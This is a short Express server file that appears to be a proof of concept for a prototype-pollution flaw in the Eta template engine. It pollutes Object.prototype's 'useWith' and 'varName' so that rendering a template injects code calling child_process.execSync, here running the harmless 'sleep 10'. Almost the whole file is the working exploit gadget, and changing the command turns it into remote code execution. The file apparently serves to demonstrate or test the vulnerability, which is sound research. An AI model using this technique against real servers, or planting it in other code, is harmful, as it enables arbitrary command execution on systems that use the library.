var express = require("express")
var app = express()
var eta = require("eta")

app.engine("eta", eta.renderFile)
app.set("view engine", "eta")
app.set('views', __dirname + '/views');

cmd = "sleep 10";

Object.prototype.useWith = "notEmpty"; Object.prototype.varName = `a=process.mainModule.require('child_process').execSync('${cmd}')`;

app.get("/eta", function (req, res) {
    res.render("template", {foo: "bar"})
})

app.listen(1337)
